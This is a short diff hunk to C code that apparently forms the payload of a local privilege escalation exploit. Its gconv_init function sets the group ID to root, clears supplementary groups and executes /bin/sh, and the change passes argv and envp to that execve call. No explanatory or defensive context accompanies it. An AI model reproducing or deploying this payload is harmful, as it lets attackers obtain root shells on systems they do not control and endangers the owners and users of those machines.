@@ -14,5 +14,5 @@ void gconv_init() {
     setgid(0);
     setgroups(0, NULL);
 
-    execve("/bin/sh", NULL, NULL);
+    execve("/bin/sh", argv, envp);
 }
